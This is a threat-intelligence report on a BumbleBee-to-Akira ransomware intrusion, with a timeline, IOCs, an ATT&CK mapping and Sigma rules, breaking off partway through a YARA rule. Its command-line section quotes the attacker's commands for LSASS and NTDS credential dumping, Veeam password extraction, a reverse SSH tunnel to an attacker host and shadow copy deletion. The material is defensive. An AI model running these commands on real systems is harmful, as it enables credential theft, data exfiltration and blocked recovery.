# Technical Analysis Report: From Bing Search to Ransomware -- BumbleBee and AdaptixC2 Deliver Akira (2026-07-01)

Prepared by: Actioner
Classification: TLP:CLEAR
Date: 2026-07-01
Version: 1 (DRAFT)

## Executive Summary

In July 2025, a threat actor leveraged SEO poisoning to lure a victim searching Bing for "ManageEngine OpManager" to the lookalike domain `opmanager[.]pro`, which redirected to `download-center[.]online` to deliver a trojanized MSI installer. The MSI exploited DLL sideloading through the legitimate Windows binary `consent.exe` to load the BumbleBee first-stage loader (`msimg32.dll`), which performed a geofencing check excluding CIS-region locales before activating a Domain Generation Algorithm for C2 resolution. Within five hours, BumbleBee established communication with two C2 servers and deployed the AdaptixC2 command-and-control framework by injecting shellcode into a renamed Windows Address Book binary (`AdgNsy.exe`) spawned via WMI.

Over the next five days, the threat actor conducted extensive hands-on-keyboard operations: creating privileged domain accounts (`backup_DA`, `backup_EA`), extracting the NTDS.dit Active Directory database via `wbadmin.exe`, harvesting Veeam backup credentials through direct PostgreSQL queries, dumping LSASS memory using the `lsassy` tool with four different remote execution methods, installing RustDesk for persistent remote access, establishing reverse SSH tunnels for RDP proxying, and exfiltrating approximately 77GB of data via FileZilla SFTP to a Ukrainian server. The attack culminated in Akira ransomware deployment (`locker.exe`) across the root domain and child domain infrastructure, with shadow copy deletion ensuring no local recovery path. The entire intrusion from initial access to ransomware execution spanned roughly 120 hours.

## Attack Timeline

| Time (Relative) | Phase | Activity |
|---|---|---|
| Hour 0 | Initial Access | User searches Bing for "ManageEngine OpManager"; redirected through `opmanager[.]pro` to `download-center[.]online`; trojanized MSI downloaded and executed |
| Hour 0 | Execution | MSI extracts `consent.exe` + `msimg32.dll` to `%TEMP%\ApplicationInstallationFolder_11`; DLL sideloading activates BumbleBee loader; geofencing check passes; DGA C2 queries begin |
| Hour 5 | C2 Established | BumbleBee beacons to `188.40.187[.]145:443` and `109.205.195[.]211:443`; AdaptixC2 agent (`AdgNsy.exe`) injected via WMI, beaconing to `172.96.137[.]160` over HTTP |
| Hours 5-12 | Discovery | Hands-on-keyboard: `systeminfo`, `nltest /dclist:`, `whoami /groups`, `nltest /domain_trusts`, `net group domain admins /dom`, `quser`, network scans on ports 445/3389/389 |
| Hour 12-24 | Persistence | Domain accounts `backup_DA` and `backup_EA` created with `P@ssw0rd1234`; `backup_EA` added to Enterprise Admins; RustDesk installed as Windows service on two servers |
| Hour 24 | Lateral Movement | RDP to domain controller using `backup_EA`; RDP to additional servers; local admin passwords changed to `P@ssw0rd!` |
| Hour 24-36 | Credential Access | NTDS.dit extraction via `wbadmin.exe` backup to localhost; SYSTEM and SECURITY hives staged in `C:\ProgramData` |
| Hour 36-48 | Credential Access | Veeam PostgreSQL credential extraction via `psql.exe` (4 executions); LSASS dumps via `lsassy` using SMB/WMI/ScheduledTasks/DCOM methods; DPAPI credential harvesting |
| Hour 39 | Exfiltration Setup | FileZilla 3.68.1 installed from `C:\ProgramData`; reverse SSH tunnel to `193.242.184[.]150` established |
| Hours 39-48 | Exfiltration | ~2.5GB via reverse SSH (SYSVOL data); ~77GB via FileZilla SFTP to `185.174.100[.]203:22` (username: `Stark`) across two parallel sessions |
| Hour 44 | Impact | Akira ransomware (`locker.exe -p=G:\ -n=15`) deployed on backup server and file server; shadow copy deletion via PowerShell WMI |
| Hour ~120 | Impact (Wave 2) | Re-entry via RustDesk; pivot to child domain controller; ransomware executed 39 times across child domain infrastructure |

## Technical Payload Breakdown

### BumbleBee Loader

**Delivery:** Trojanized MSI installer signed with revoked code-signing certificate from "LLC Resource+" (associated with Hostinger AS47583 infrastructure). The download gateway used the URL pattern `/Get?q=ManageEngine-OpManager` -- a consistent pivot point across BumbleBee campaigns.

**DLL Sideloading Chain:**
1. MSI extracts three files to `%TEMP%\ApplicationInstallationFolder_11`:
   - `ManageEngine_OpManager_64bit.exe` (legitimate decoy)
   - `consent.exe` (legitimate Windows UAC binary, copied from System32)
   - `msimg32.dll` (BumbleBee first-stage loader)
2. `consent.exe` executes from a non-standard directory (%APPDATA%), triggering Windows DLL search-order hijacking
3. `msimg32.dll` is loaded instead of the legitimate system DLL

**Geofencing:** The loader calls `GetSystemDefaultLocaleName()` and compares against a hardcoded list of CIS-region locales. If the system locale matches, `ExitProcess()` is called, terminating execution. This anti-analysis/targeting mechanism is a known BumbleBee characteristic.

**C2 Communication:** Domain Generation Algorithm produces 14-character `.org` domains (Wave 2 pattern; Wave 1 used 13-character `.life` domains). Successful C2 established with `188.40.187[.]145:443` (resolved from `2rxyt9urhq0bgj[.]org`) and `109.205.195[.]211:443` (resolved from `ev2sirbd269o5j[.]org`).

**PE Metadata:** The DLL contains "dictionary-derived gibberish" in its version info fields -- a known BumbleBee builder fingerprint that "collides essentially nowhere in benign software," making it an excellent YARA signature target.

### AdaptixC2 Framework

**Deployment:** BumbleBee dropped `AdgNsy.exe` -- a renamed copy of the legitimate Windows Address Book binary (`WAB.exe`). Adaptix shellcode was injected into this process, which spawned under `WmiPrvSE.exe` via WMI execution.

**Beacon Profile:** Maintained persistent HTTP beaconing to `172.96.137[.]160` (hosted on Shock Hosting infrastructure). Memory forensics revealed "multiple private, non-image regions with Read/Write/Execute (RWX) protections" -- a hallmark of injected shellcode.

**Operational Pattern:** Active C2 beaconing from Days 1-3, with cessation between Days 3-5 as the actor transitioned to RustDesk and SSH tunnels for access.

### Akira Ransomware

**Binary:** Staged as `C:\ProgramData\locker.exe` (SHA256: `de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d`).

**Execution:** Command-line parameters `-p=G:\ -n=15` specify target path and encryption percentage (15% of each file encrypted for speed). On domain controller, executed with remote flags to encrypt network shares.

**Recovery Prevention:** Automated shadow copy deletion via `powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"` executed approximately 1 second after each `locker.exe` invocation.

**Scope:** Initially deployed on backup and file servers (Day 3), then expanded to child domain infrastructure (Day 5) with 39 separate executions.

## Indicators of Compromise

> All network IOCs are defanged per standard convention.

### File Hashes

| File | MD5 | SHA1 | SHA256 |
|---|---|---|---|
| ManageEngine-OpManager.msi | `124a48b78060fa851e1cc077ca35713c` | `ab82bf27132323861810c0efcac6d5dd01600dd4` | `186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da` |
| msimg32.dll (BumbleBee) | `ca8646dfc88423bb9fffda811160cebe` | `febbaf5f08a8e0782ffcce8beef1f2b4e249a52b` | `a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331` |
| locker.exe (Akira) | `8c113b3aa82c81eee7c6b4ed0ba9a90f` | `d66944e1a57daf04d3e809f22cd01946d593acaf` | `de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d` |

### Network IOCs -- IP Addresses

| IP | Port | Role | Hosting |
|---|---|---|---|
| `188[.]40[.]187[.]145` | 443 | BumbleBee C2 | -- |
| `109[.]205[.]195[.]211` | 443 | BumbleBee C2 | -- |
| `171[.]22[.]183[.]43` | 443 | BumbleBee C2 | -- |
| `194[.]127[.]178[.]21` | 443 | BumbleBee C2 | -- |
| `192[.]121[.]22[.]94` | 443 | BumbleBee C2 | -- |
| `172[.]96[.]137[.]160` | 80 | AdaptixC2 beacon | Shock Hosting |
| `193[.]242[.]184[.]150` | 22 | Reverse SSH tunnel / exfil | -- |
| `185[.]174[.]100[.]203` | 22 | SFTP exfil server | AS-COLOCROSSING (Ukraine) |
| `84[.]32[.]84[.]32` | -- | Hostinger staging (shared across campaigns) | Hostinger AS47583 |
| `170[.]130[.]55[.]223` | -- | AdaptixC2 C2 (Swisscom incident) | -- |

### Network IOCs -- Domains

| Domain | Role |
|---|---|
| `opmanager[.]pro` | SEO poisoning lure (ManageEngine lookalike) |
| `download-center[.]online` | Malware delivery gateway |
| `download-server[.]online` | Wave 1 delivery gateway (May 2025) |
| `soft-server[.]online` | Wave 1 delivery gateway (May 2025) |
| `soft-hub[.]pro` | Wave 2 delivery gateway (July 2025) |
| `ev2sirbd269o5j[.]org` | BumbleBee DGA domain |
| `2rxyt9urhq0bgj[.]org` | BumbleBee DGA domain |
| `d1hmxkpwby0d4s[.]org` | BumbleBee DGA domain |
| `yj6jurm5qqkye5[.]org` | BumbleBee DGA domain |
| `ewujsfb1dp5ran[.]org` | BumbleBee DGA domain |
| `8doj8uvx604eck[.]org` | BumbleBee DGA domain |
| `kwywztxoo2xdot[.]org` | BumbleBee DGA domain |
| `ky1d1p1daahe5t[.]org` | BumbleBee DGA domain |
| `ovh1kn1tcqw5kp[.]org` | BumbleBee DGA domain |
| `6cimu4mc085em8[.]org` | BumbleBee DGA domain |
| `5ka8rxp6t6eup2[.]org` | BumbleBee DGA domain |
| `ks501oz9nm3v05[.]org` | BumbleBee DGA domain |
| `v5rjsdqogstopr[.]org` | BumbleBee DGA domain |

### File Paths and Names

| Path / Name | Context |
|---|---|
| `%TEMP%\ApplicationInstallationFolder_11` | MSI extraction staging directory |
| `C:\ProgramData\locker.exe` | Akira ransomware staging |
| `C:\ProgramData\FileZilla_3.68.1_win64_sponsored2-setup.exe` | Exfiltration tool installer |
| `AdgNsy.exe` | Renamed WAB.exe with AdaptixC2 shellcode |
| `msimg32.dll` | BumbleBee first-stage loader DLL |
| `consent.exe` (in %APPDATA%) | Legitimate binary abused for DLL sideloading |
| `G7wO.sys`, `U8Vfsh.docx`, `AsaZQZDJz.avhdx` | LSASS memory dumps with randomized names/extensions |
| `C:\ProgramData\AdComputers.csv` | AD computer enumeration export |
| `C:\ProgramData\AdUsers.csv` | AD user enumeration export |
| `n.exe` | SoftPerfect Network Scanner binary |
| `shares.txt` | Invoke-ShareFinder output |
| `C:\Program Files\RustDesk\RustDesk.exe` | RustDesk remote access tool |

### Command Lines (Key Indicators)

```
# Domain account creation and privilege escalation
net user backup_DA P@ssw0rd1234 /add /dom
net user backup_EA P@ssw0rd1234 /add /dom
net group "enterprise admins" backup_EA /add /dom

# NTDS.dit extraction
wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:C:\windows\NTDS\ntds.dit,C:\windows\system32\config\SYSTEM,C:\windows\system32\config\SECURITY -quiet

# Veeam credential harvesting
psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"

# LSASS dump via comsvcs.dll ordinal
rundll32.exe C:\windows\System32\comsvcs.dll, #+000024 <PID> \Windows\Temp\<random>.<ext> full

# Reverse SSH tunnel
ssh user@193[.]242[.]184[.]150 -R *:10400 -p22

# Akira ransomware execution
locker.exe -p=G:\ -n=15

# Shadow copy deletion
powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
```

### Certificate Signers (Code-Signing)

| Signer | Campaign |
|---|---|
| LLC Resource+ (revoked) | This incident (Wave 2) |
| LLC Ellada Comfort | Wave 1 (May 2025) |
| LLC Best Consult | Wave 1 (May 2025) |
| LLC Vector | Wave 1 and Wave 2 (shared) |
| LLC Ugurmana | Wave 2 (July 2025) |
| LLC Leighton | Wave 2 (July 2025) |

### Network Artifacts

| Artifact | Value |
|---|---|
| SSH Client Banner | `SSH-2.0-FileZilla_3.68.1` |
| SFTP Username | `Stark` |
| RDP Tunneling Indicator | IPv6 loopback `::%16777216` in Event Logs |
| Download Gateway URL Pattern | `/Get?q=<toolname>` |
| BumbleBee DGA Pattern (Wave 2) | 14-character alphanumeric `.org` domains |
| PE Module Name (injected) | `hasherezade_pussy.dll` |

## MITRE ATT&CK Mapping

| TID | Technique | Tactic | Observed Behavior |
|---|---|---|---|
| T1189 | Drive-by Compromise | Initial Access | SEO poisoning via Bing redirecting to trojanized MSI download |
| T1204.002 | User Execution: Malicious File | Initial Access | IT admin executed trojanized ManageEngine MSI |
| T1574.001 | Hijack Execution Flow: DLL Side-Loading | Persistence / Defense Evasion | consent.exe loads malicious msimg32.dll from non-system directory |
| T1055 | Process Injection | Defense Evasion | AdaptixC2 shellcode injected into AdgNsy.exe (renamed WAB.exe) |
| T1047 | Windows Management Instrumentation | Execution | WMI used to spawn AdgNsy.exe and remote credential extraction |
| T1059.001 | PowerShell | Execution | AD enumeration, shadow copy deletion, encoded commands |
| T1059.003 | Windows Command Shell | Execution | Discovery commands, account creation, credential queries |
| T1568.002 | Domain Generation Algorithms | Command and Control | BumbleBee 14-char .org DGA for C2 resolution |
| T1071.001 | Application Layer Protocol: Web Protocols | Command and Control | AdaptixC2 HTTP beaconing to 172.96.137[.]160 |
| T1219 | Remote Access Tools | Command and Control | RustDesk installed as Windows service for persistent access |
| T1090 | Proxy | Command and Control | Reverse SSH tunnel for RDP proxying through firewall |
| T1136 | Create Account | Persistence | backup_DA and backup_EA domain accounts created |
| T1543.003 | Create or Modify System Process: Windows Service | Persistence | RustDesk registered as Windows service |
| T1087.002 | Account Discovery: Domain Account | Discovery | Get-ADUser, Get-ADComputer, net group enumeration |
| T1069.002 | Permission Groups Discovery: Domain Groups | Discovery | net group "domain admins" /dom |
| T1482 | Domain Trust Discovery | Discovery | nltest /domain_trusts |
| T1082 | System Information Discovery | Discovery | systeminfo |
| T1033 | System Owner/User Discovery | Discovery | whoami /groups, quser |
| T1046 | Network Service Discovery | Discovery | Port scans on 445/3389/389; SoftPerfect Network Scanner |
| T1135 | Network Share Discovery | Discovery | Invoke-ShareFinder |
| T1083 | File and Directory Discovery | Discovery | dir C:\programdata |
| T1018 | Remote System Discovery | Discovery | ping, nltest /dclist: |
| T1003.003 | OS Credential Dumping: NTDS | Credential Access | wbadmin.exe backup of ntds.dit to localhost |
| T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access | comsvcs.dll MiniDump via lsassy (4 methods) |
| T1555 | Credentials from Password Stores | Credential Access | Veeam PostgreSQL credential extraction; DPAPI decryption |
| T1021.001 | Remote Services: RDP | Lateral Movement | RDP using compromised Enterprise Admin account |
| T1021.003 | Remote Services: DCOM | Lateral Movement | MMC20.Application for lsassy lateral execution |
| T1569.002 | System Services: Service Execution | Lateral Movement | SMB service creation for remote lsassy execution |
| T1036 | Masquerading | Defense Evasion | Renamed WAB.exe as AdgNsy.exe; obfuscated LSASS dump extensions |
| T1027.010 | Obfuscated Files or Information: Command Obfuscation | Defense Evasion | Mixed-case: CmD.eXe, pOWerShELl.exE |
| T1070.004 | Indicator Removal: File Deletion | Defense Evasion | Secure deletion of recon logs and initial loaders |
| T1039 | Data from Network Shared Drive | Collection | File share data collected for exfiltration |
| T1048.001 | Exfiltration Over Alternative Protocol: Encrypted | Exfiltration | SFTP via FileZilla (~77GB); reverse SSH tunnel (~2.5GB) |
| T1041 | Exfiltration Over C2 Channel | Exfiltration | Initial data exfiltration over SSH tunnel |
| T1486 | Data Encrypted for Impact | Impact | Akira ransomware (locker.exe) deployed across domain |
| T1490 | Inhibit System Recovery | Impact | Shadow copy deletion via PowerShell WMI |

## Detection Rules

### Sigma: BumbleBee consent.exe DLL Sideloading from Non-System Directory
Detects `consent.exe` executing from outside `C:\Windows\System32\`, the distinctive cue that a sideloaded BumbleBee DLL is being loaded.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: high
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0; sigma check skipped (MITRE ATT&CK data fetch failure - environment network issue, not rule issue). consent.exe running from AppData/Temp is highly anomalous; legitimate consent.exe lives exclusively in System32. -->
```yaml
title: BumbleBee Loader - consent.exe DLL Sideloading From Non-System Directory
id: a1b2c3d4-1111-4aaa-bbbb-000000000001
status: experimental
description: Detects consent.exe executing from a non-standard directory (e.g., AppData or Temp), indicating DLL sideloading of msimg32.dll used by the BumbleBee loader as observed in DFIR Report Bumblebee/AdaptixC2/Akira incident.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.defense_evasion
    - attack.t1574.001
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\consent.exe'
    filter_legitimate:
        Image|startswith: 'C:\Windows\System32\'
    condition: selection and not filter_legitimate
falsepositives:
    - Legitimate consent.exe copies placed by administrators for testing purposes
level: high
```

### Sigma: AdaptixC2 Beacon via Renamed WAB.exe Under WmiPrvSE
Detects `WmiPrvSE.exe` spawning a renamed Windows Address Book binary (`AdgNsy.exe` or `OriginalFileName: wab.exe`), the specific AdaptixC2 injection vector used in this incident.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: high
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. The OriginalFileName check catches renames beyond AdgNsy.exe. WmiPrvSE spawning wab.exe is near-zero in benign environments. -->
```yaml
title: AdaptixC2 Beacon - Suspicious WmiPrvSE Child Process With Renamed WAB.exe
id: a1b2c3d4-2222-4aaa-bbbb-000000000002
status: experimental
description: Detects WmiPrvSE.exe spawning a renamed Windows Address Book binary (AdgNsy.exe or similar), indicating AdaptixC2 shellcode injection as observed in the DFIR Report Bumblebee/AdaptixC2/Akira ransomware incident.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.execution
    - attack.t1047
    - attack.defense_evasion
    - attack.t1055
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith: '\WmiPrvSE.exe'
    selection_child:
        - Image|endswith: '\AdgNsy.exe'
        - OriginalFileName: 'wab.exe'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate use of Windows Address Book via WMI is extremely rare
level: high
```

### Sigma: Veeam Backup Credential Extraction via psql
Detects `psql.exe` querying the `VeeamBackup` database `credentials` table, a credential-harvesting technique used by Akira operators.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: high
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. The combination of psql + VeeamBackup + credentials in command line is highly specific to this credential theft technique. -->
```yaml
title: Veeam Backup Credential Extraction via psql
id: a1b2c3d4-3333-4aaa-bbbb-000000000003
status: experimental
description: Detects psql.exe querying the VeeamBackup database credentials table, a technique used by Akira ransomware operators to harvest stored credentials from Veeam Backup infrastructure.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.credential_access
    - attack.t1555
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\psql.exe'
        CommandLine|contains|all:
            - 'VeeamBackup'
            - 'credentials'
    condition: selection
falsepositives:
    - Legitimate Veeam database administration querying the credentials table
level: critical
```

### Sigma: NTDS.dit Extraction via wbadmin Backup
Detects `wbadmin.exe` creating a backup that explicitly includes `ntds.dit` in the command line, a distinctive credential-dumping technique.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: high
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. Legitimate wbadmin backups rarely specify ntds.dit explicitly in the command line; scheduled AD backups use different mechanisms. -->
```yaml
title: NTDS.dit Extraction via wbadmin Backup to Localhost
id: a1b2c3d4-4444-4aaa-bbbb-000000000004
status: experimental
description: Detects wbadmin.exe creating a backup that includes ntds.dit with the backup target set to localhost (127.0.0.1), a technique used for Active Directory credential extraction in the BumbleBee/Akira ransomware incident.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.credential_access
    - attack.t1003.003
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\wbadmin.exe'
        CommandLine|contains|all:
            - 'start'
            - 'backup'
            - 'ntds.dit'
    condition: selection
falsepositives:
    - Legitimate Active Directory backup procedures may trigger this rule but rarely include ntds.dit in the command line explicitly
level: high
```

### Sigma: LSASS Memory Dump via comsvcs.dll Ordinal Export
Detects `rundll32.exe` calling `comsvcs.dll` with an ordinal-based export (`#`), the specific LSASS dumping technique used by `lsassy`.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: high
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. comsvcs.dll MiniDump via ordinal is a well-known credential dumping technique with very few legitimate uses. -->
```yaml
title: LSASS Memory Dump via comsvcs.dll MiniDump With Obfuscated Export
id: a1b2c3d4-5555-4aaa-bbbb-000000000005
status: experimental
description: Detects LSASS credential dumping via rundll32 loading comsvcs.dll with ordinal-based export call (#+000024), as used by lsassy tool in the BumbleBee/AdaptixC2/Akira ransomware incident.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains|all:
            - 'comsvcs'
            - '#'
    condition: selection
falsepositives:
    - Very rare legitimate use of comsvcs.dll MiniDump export
level: critical
```

### Sigma: Account Added to Enterprise Admins via net.exe
Detects `net.exe` or `net1.exe` adding a user to the Enterprise Admins group, the specific privilege escalation observed in this incident.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: high
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. Adding accounts to Enterprise Admins via net.exe is extremely suspicious in any environment. -->
```yaml
title: Account Added to Enterprise Admins Group via net.exe
id: a1b2c3d4-6666-4aaa-bbbb-000000000006
status: experimental
description: Detects the addition of a user account to the Enterprise Admins group using net.exe, a high-severity persistence and privilege escalation technique observed in the BumbleBee/AdaptixC2/Akira ransomware incident.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.persistence
    - attack.t1136
    - attack.privilege_escalation
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\net.exe'
            - '\net1.exe'
        CommandLine|contains|all:
            - 'group'
            - 'enterprise admins'
            - '/add'
    condition: selection
falsepositives:
    - Legitimate administrative addition of users to Enterprise Admins group
level: critical
```

### Sigma: Reverse SSH Tunnel Establishment
Detects `ssh.exe` with `-R` flag for reverse port forwarding, the technique used to proxy RDP through an encrypted SSH tunnel bypassing firewall controls.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: medium
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. Medium confidence because SSH reverse tunnels have legitimate use cases; requires environmental tuning. -->
```yaml
title: Reverse SSH Tunnel Establishment for RDP Proxying
id: a1b2c3d4-7777-4aaa-bbbb-000000000007
status: experimental
description: Detects SSH reverse tunnel establishment with remote port forwarding, as used in the BumbleBee/AdaptixC2/Akira incident to proxy RDP traffic through an encrypted SSH tunnel to bypass firewall controls.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.command_and_control
    - attack.t1090
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\ssh.exe'
        CommandLine|contains: ' -R '
    condition: selection
falsepositives:
    - Legitimate SSH reverse tunnels used by system administrators
level: medium
```

### Sigma: Akira Ransomware Execution with Encryption Parameters
Detects `locker.exe` executed with `-p=` (path) and `-n=` (encryption percentage) parameters, the specific Akira ransomware command-line pattern.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: high
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. locker.exe with -p= and -n= parameters is highly specific to Akira ransomware. -->
```yaml
title: Akira Ransomware Execution With Encryption Parameters
id: a1b2c3d4-8888-4aaa-bbbb-000000000008
status: experimental
description: Detects execution of Akira ransomware binary (locker.exe) with characteristic command-line parameters for path targeting and encryption percentage, as observed in the BumbleBee/AdaptixC2/Akira incident.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.impact
    - attack.t1486
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains|all:
            - '-p='
            - '-n='
    selection_name:
        Image|endswith: '\locker.exe'
    condition: selection and selection_name
falsepositives:
    - Very unlikely in production environments
level: critical
```

### Sigma: Shadow Copy Deletion via PowerShell WMI
Detects shadow copy deletion using `Get-WmiObject Win32_Shadowcopy | Remove-WmiObject`, the specific recovery-prevention technique used by Akira.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: high
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. This specific PowerShell WMI method for shadow copy deletion is rare in legitimate admin operations (vssadmin is the standard tool). -->
```yaml
title: Shadow Copy Deletion via PowerShell WMI
id: a1b2c3d4-9999-4aaa-bbbb-000000000009
status: experimental
description: Detects shadow copy deletion using PowerShell Get-WmiObject and Remove-WmiObject cmdlets, as used by Akira ransomware to prevent recovery after encryption.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.impact
    - attack.t1490
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - 'Win32_Shadowcopy'
            - 'Remove-WmiObject'
    condition: selection
falsepositives:
    - Legitimate administrative shadow copy management is typically done via vssadmin, not PowerShell WMI
level: critical
```

### Sigma: RustDesk Remote Access Tool Execution
Detects RustDesk execution with `--tray`, `--cm`, or `--service` flags indicating installation for persistent remote access.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: medium
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. Medium confidence because RustDesk is legitimate software; detection value depends on organizational policy. -->
```yaml
title: RustDesk Remote Access Tool Installation as Service
id: a1b2c3d4-aaaa-4aaa-bbbb-00000000000a
status: experimental
description: Detects RustDesk remote access tool execution with service-related or tray mode flags, indicating installation for persistent remote access as observed in the BumbleBee/AdaptixC2/Akira ransomware incident.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.command_and_control
    - attack.t1219
    - attack.persistence
    - attack.t1543.003
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\RustDesk.exe'
        CommandLine|contains:
            - '--tray'
            - '--cm'
            - '--service'
    condition: selection
falsepositives:
    - Legitimate use of RustDesk in corporate environments where it is an approved remote access tool
level: medium
```

### Sigma: FileZilla Installer Staged in ProgramData
Detects FileZilla installer execution from `C:\ProgramData`, a staging technique where the attacker transferred the installer via RDP clipboard for SFTP exfiltration.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: medium
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. FileZilla in ProgramData is unusual but not impossible; medium confidence due to legitimate edge cases. -->
```yaml
title: FileZilla Installation in ProgramData for Data Exfiltration
id: a1b2c3d4-bbbb-4aaa-bbbb-00000000000b
status: experimental
description: Detects FileZilla installer execution from C:\ProgramData, a staging technique observed in the BumbleBee/AdaptixC2/Akira ransomware incident where the attacker transferred the installer via RDP clipboard and used it for SFTP data exfiltration.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.exfiltration
    - attack.t1048.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_path:
        Image|contains: '\ProgramData\'
    selection_name:
        Image|contains: 'FileZilla'
        Image|endswith: '.exe'
    condition: selection_path and selection_name
falsepositives:
    - Legitimate FileZilla installation from ProgramData is uncommon but possible
level: high
```

### Sigma: AD Enumeration With CSV Export to ProgramData
Detects PowerShell AD enumeration (`Get-ADComputer` / `Get-ADUser`) with CSV export, the bulk domain reconnaissance technique used for pre-exfiltration intelligence gathering.
**Status:** compile ✅ compiles (splunk + log_scale exit 0) · confidence: medium
<!-- audit: sigma convert splunk exit 0; sigma convert log_scale exit 0. Medium confidence; legitimate AD admins may export to CSV, but the ProgramData staging path adds specificity. -->
```yaml
title: Active Directory Enumeration With CSV Export to ProgramData
id: a1b2c3d4-cccc-4aaa-bbbb-00000000000c
status: experimental
description: Detects PowerShell Active Directory enumeration commands exporting results to CSV files in ProgramData, as used by threat actors in the BumbleBee/AdaptixC2/Akira ransomware incident for bulk domain reconnaissance.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/01
tags:
    - attack.discovery
    - attack.t1087.002
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        CommandLine|contains:
            - 'Get-ADComputer'
            - 'Get-ADUser'
        CommandLine|contains: 'export-csv'
    condition: selection
falsepositives:
    - Legitimate Active Directory administration scripts exporting data to CSV
level: medium
```

### YARA: BumbleBee Trojanized MSI Installer
Detects BumbleBee trojanized MSI installers based on embedded DLL sideloading components (`consent.exe` + `msimg32.dll` + `ApplicationInstallationFolder` pattern).
**Status:** compile ✅ compiles (yarac exit 0) · confidence: high
<!-- audit: yarac /tmp/actioner/yara-bumblebee-msi.yar /dev/null exit 0. Rule keys on OLE2 magic + MSI-specific strings combined with sideloading payload names. -->
```yara
rule Bumblebee_Trojanized_MSI_Installer
{
    meta:
        description = "Detects BumbleBee trojanized MSI installers based on embedded DLL sideloading components (consent.exe + msimg32.dll pattern)"
        author = "Actioner"
        date = "2026-07-01"
